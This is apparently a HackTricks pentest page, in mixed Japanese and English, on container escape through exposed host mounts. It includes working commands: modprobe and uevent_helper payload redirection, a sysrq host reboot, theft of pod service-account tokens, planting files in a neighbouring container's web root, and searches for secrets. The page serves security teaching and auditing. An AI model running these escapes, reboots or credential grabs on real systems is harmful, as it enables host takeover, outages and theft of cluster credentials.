# 機密性の高いホストマウント

{{#include ../../../banners/hacktricks-training.md}}

## 概要

ホストマウントは、慎重に分離されたプロセスのビューをホスト資源の直接的な可視性に戻してしまうことが多いため、実務上最も重要なcontainer-escapeの攻撃面の一つです。危険なケースは `/` に限りません。`/proc`、`/sys`、`/var` のバインドマウント、ランタイムソケット、kubelet によって管理される状態、またはデバイス関連のパスは、カーネル制御、資格情報、隣接するコンテナのファイルシステム、ランタイム管理インターフェースを露出させる可能性があります。

このページは個別の保護ページとは別に存在します。なぜなら悪用モデルが横断的だからです。書き込み可能なホストマウントが危険なのは部分的には mount namespaces、部分的には user namespaces、部分的には AppArmor や SELinux の適用範囲、そして部分的にはどのホストパスが露出したかに依存します。独立したトピックとして扱うことで、攻撃面を理解しやすくなります。

## `/proc` の露出

procfs は通常のプロセス情報と、重大な影響を与えるカーネル制御インターフェースの両方を含んでいます。`-v /proc:/host/proc` のようなバインドマウントや、予期しない書き込み可能な proc エントリを露出するコンテナビューは、情報漏えい、サービス拒否、あるいはホスト上での直接的なコード実行につながる可能性があります。

高価値な procfs パスには次のものが含まれます:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### 悪用

まず、どの高価値な procfs エントリが可視または書き込み可能かを確認します:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
These paths are interesting for different reasons. `core_pattern`, `modprobe`, and `binfmt_misc` can become host code-execution paths when writable. `kallsyms`, `kmsg`, `kcore`, and `config.gz` are powerful reconnaissance sources for kernel exploitation. `sched_debug` and `mountinfo` reveal process, cgroup, and filesystem context that can help reconstruct the host layout from inside the container.

各パスは目的や影響が異なるため、すべてを同じ影響度として扱うとトリアージが困難になります:

- `/proc/sys/kernel/core_pattern`
もし書き込み可能であれば、クラッシュ後にカーネルがパイプハンドラを実行するため、最も高い影響度を持つprocfsパスの一つです。コンテナが`core_pattern`をオーバーレイ内やマウントされたホストパスに置かれたペイロードに向けられると、ホストでのコード実行を得られることがよくあります。詳細な例は See also [read-only-paths.md](protections/read-only-paths.md) for a dedicated example.
- `/proc/sys/kernel/modprobe`
このパスは、カーネルがモジュール読み込みロジックをユーザ空間ヘルパで呼び出す際に使われるヘルパを制御します。コンテナから書き込み可能でホスト文脈で解釈されると、別のホストでのコード実行プリミティブになり得ます。ヘルパパスをトリガーする方法と組み合わせると特に興味深いです。
- `/proc/sys/vm/panic_on_oom`
通常はクリーンな脱出プリミティブではありませんが、OOM条件をカーネルパニックに変えることでメモリ圧迫をホスト全体のDoSに変換できます。
- `/proc/sys/fs/binfmt_misc`
登録インターフェイスが書き込み可能であれば、攻撃者は選択したマジック値に対するハンドラを登録し、マッチするファイルが実行されたときにホスト文脈での実行を得る可能性があります。
- `/proc/config.gz`
カーネルエクスプロイトのトリアージに有用です。ホストのパッケージメタデータを必要とせずに、どのサブシステムや緩和策、オプションのカーネル機能が有効かを判断するのに役立ちます。
- `/proc/sysrq-trigger`
主にサービス妨害のためのパスですが非常に深刻です。即座に再起動、パニック、その他ホストの重大な破壊を引き起こすことができます。
- `/proc/kmsg`
kernel ring buffer のメッセージを明らかにします。ホストのフィンガープリンティング、クラッシュ解析に有用で、環境によってはカーネルエクスプロイトに役立つ情報の leaking に使えることがあります。
- `/proc/kallsyms`
読み取り可能であれば、エクスポートされたカーネルシンボル情報が露出し、カーネルエクスプロイト開発時にASLR等の想定を崩すのに役立つ可能性があります。
- `/proc/[pid]/mem`
プロセスメモリへの直接インターフェイスです。対象プロセスが必要なptrace-styleの条件で到達可能であれば、別プロセスのメモリを読み書きできることがあります。現実的な影響は資格情報、`hidepid`、Yama、ptrace制限に大きく依存するため、強力だが条件付きのパスです。
- `/proc/kcore`
システムメモリのコアイメージ風ビューを公開します。ファイルは巨大で扱いにくいですが、意味のある読み取りが可能であればホストメモリが重大に露出していることを示します。
- `/proc/kmem` and `/proc/mem`
歴史的に高影響の生メモリインターフェイスです。多くのモダンなシステムでは無効化または厳しく制限されていますが、存在し利用可能であれば重大な発見として扱うべきです。
- `/proc/sched_debug`
Leaks スケジューリングやタスク情報を露出し、他のプロセスビューが予想よりもクリーンに見える場合でもホストプロセスの識別子を暴露する可能性があります。
- `/proc/[pid]/mountinfo`
コンテナがホスト上のどこに実際に存在するか、どのパスがオーバーレイに裏打ちされているか、書き込み可能なマウントがホストのコンテンツに対応するものか単にコンテナレイヤーだけかを再構築するのに非常に有用です。

If `/proc/[pid]/mountinfo` or overlay details are readable, use them to recover the host path of the container filesystem:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
これらのコマンドは、コンテナ内のパスをホスト側から見た対応するパスに変換する必要があるホストでの実行トリックが多数あるため、有用です。

### 完全な例: `modprobe` Helper Path Abuse

コンテナから `/proc/sys/kernel/modprobe` が書き込み可能で、ヘルパーパスがホストのコンテキストで解釈される場合、攻撃者が制御するpayloadへリダイレクトできます:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
正確なトリガーはターゲットや kernel の挙動によって異なるが、重要なのは、書き込み可能な helper パスが将来のカーネル helper 呼び出しを攻撃者が制御する host-path の内容へリダイレクトできる点である。

### 完全な例: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

もし目的が即時の escape ではなく exploitability assessment である場合:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
これらのコマンドは、有用なシンボル情報が見えるか、最近のカーネルメッセージが興味深い状態を示すか、どのカーネル機能や緩和策がコンパイルされているかを確認するのに役立ちます。影響は通常直接的な脱出ではありませんが、カーネル脆弱性のトリアージを大幅に短縮できます。

### 完全な例: SysRq Host Reboot

もし `/proc/sysrq-trigger` が書き込み可能でホスト側から見える場合：
```bash
echo b > /proc/sysrq-trigger
```
その影響は即座にホストの再起動を引き起こします。これは微妙な例ではありませんが、procfs の露出が単なる情報開示よりもはるかに深刻になり得ることを明確に示しています。

## `/sys` の露出

sysfs は大量のカーネルおよびデバイスの状態を公開します。いくつかの sysfs パスは主に fingerprinting に有用ですが、他のパスは helper execution、デバイス動作、security-module の構成、あるいは firmware state に影響を与える可能性があります。

High-value sysfs paths include:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

これらのパスはそれぞれ別の理由で重要です。`/sys/class/thermal` は thermal-management の挙動に影響を与え、露出がひどい環境ではホストの安定性に影響する可能性があります。`/sys/kernel/vmcoreinfo` は低レベルのホスト fingerprinting に役立つ crash-dump および kernel-layout 情報を leak する可能性があります。`/sys/kernel/security` は Linux Security Modules が使用する `securityfs` インターフェースであり、予期せぬアクセスは MAC 関連の状態を露出または変更する可能性があります。EFI 変数パスは firmware-backed の起動設定に影響する可能性があり、通常の設定ファイルよりはるかに深刻です。`/sys/kernel/debug` の下にある `debugfs` は特に危険で、意図的に開発者向けのインターフェースであり、強化されたプロダクション向けカーネル APIs よりも安全性に関する期待がはるかに低いためです。

Useful review commands for these paths are:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
- `/sys/kernel/security` は、AppArmor、SELinux、または他の LSM のインターフェースがホスト限定であるべきところで見えてしまっているかを示すことがある。
- `/sys/kernel/debug` はこのグループで最も衝撃的な発見であることが多い。`debugfs` がマウントされ読み取りまたは書き込み可能な場合、有効なデバッグノードに依存してリスクが決まる広範なカーネル向けインターフェースが存在すると考えられる。
- EFI 変数の露出はあまり一般的ではないが、存在すれば影響は大きい。通常のランタイムファイルではなくファームウェアに保持される設定に触れるためだ。
- `/sys/class/thermal` は主にホストの安定性やハードウェアとの相互作用に関係し、シェル脱出のような用途には直接つながらない。
- `/sys/kernel/vmcoreinfo` は主にホストのフィンガープリンティングやクラッシュ解析の情報源であり、低レベルのカーネル状態を理解するのに有用である。

### 完全な例: `uevent_helper`

If `/sys/kernel/uevent_helper` is writable, the kernel may execute an attacker-controlled helper when a `uevent` is triggered:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
この方法が機能する理由は、ヘルパーのパスがホストの視点から解釈されるためです。トリガーされると、そのヘルパーは現在のコンテナ内ではなくホストのコンテキストで実行されます。

## `/var` の露出

ホストの `/var` をコンテナにマウントすることは、`/` をマウントするほど劇的に見えないため過小評価されがちです。実際には、ランタイムソケット、container snapshot ディレクトリ、kubelet が管理する pod ボリューム、projected service-account tokens、隣接するアプリケーションのファイルシステムに到達するのに十分なことがあります。最新のノードでは、最も運用上興味深いコンテナの状態が実際に `/var` に存在することが多いです。

### Kubernetes の例

`hostPath: /var` を持つ pod は、しばしば他の pod の projected tokens や overlay snapshot コンテンツを読み取ることができます:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
これらのコマンドは、マウントが単なる退屈なアプリケーションデータのみを露出しているのか、それとも重大な影響を及ぼすクラスタ認証情報まで露出しているのかを判別できるため有用です。読み取り可能な service-account token は、ローカルでのコード実行を即座に Kubernetes API へのアクセスに変える可能性があります。

token が存在する場合、token の発見でそこで止まらず、token が到達できる範囲を検証してください：
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
ここでの影響はローカルノードへのアクセスよりもはるかに大きい可能性があります。広範な RBAC を持つ token はマウントされた `/var` をクラスタ全体の侵害につなげる可能性があります。

### Docker と containerd の例

Docker ホストでは関連データはしばしば `/var/lib/docker` の下にあり、containerd を利用する Kubernetes ノードでは `/var/lib/containerd` や snapshotter 固有のパスにあることがあります:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
マウントされた `/var` が別のワークロードの書き込み可能な snapshot の内容を公開している場合、attacker は現在の container 設定に触れずにアプリケーションファイルを改ざんしたり、ウェブコンテンツを設置したり、起動スクリプトを変更したりできる可能性があります。

書き込み可能な snapshot コンテンツが見つかった場合の具体的な悪用アイデア：
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
これらのコマンドは、マウントされた `/var` がもたらす主な影響の3分類 — application tampering, secret recovery, and lateral movement into neighboring workloads — を示すために有用です。

## Runtime Sockets

センシティブなホストマウントは、完全なディレクトリではなく runtime sockets を含むことが多いです。これらは非常に重要なので、ここでも明確に繰り返す価値があります：
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
これらの sockets のいずれかがマウントされた場合の完全な exploitation flows については [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) を参照してください。

簡単な最初のインタラクションパターン：
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
もしこれらのうちのどれかが成功すると、"mounted socket" から "start a more privileged sibling container" への経路は通常どの kernel breakout 経路よりもはるかに短い。

## Mount-Related CVEs

Host mounts はランタイムの脆弱性とも交差する。重要な最近の例は次のとおり:

- `CVE-2024-21626` in `runc`、where a leaked directory file descriptor could place the working directory on the host filesystem.
- `CVE-2024-23651` and `CVE-2024-23653` in BuildKit、where OverlayFS copy-up races could produce host-path writes during builds.
- `CVE-2024-1753` in Buildah and Podman build flows、where crafted bind mounts during build could expose `/` read-write.
- `CVE-2024-40635` in containerd、where a large `User` value could overflow into UID 0 behavior.

これらのCVEがここで重要なのは、マウント処理が単にオペレータの設定の問題だけではないことを示している点だ。ランタイム自体が mount-driven escape conditions を導入する場合もある。

## Checks

Use these commands to locate the highest-value mount exposures quickly:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
- ホストの root、`/proc`、`/sys`、`/var`、およびランタイムソケットはいずれも高優先度の所見です。
- 書き込み可能な proc/sys エントリは、多くの場合マウントが安全なコンテナのビューではなくホスト全体のカーネル制御を露出していることを意味します。
- マウントされた `/var` パスは、ファイルシステムのレビューだけでなく資格情報や隣接するワークロードのレビューが必要です。
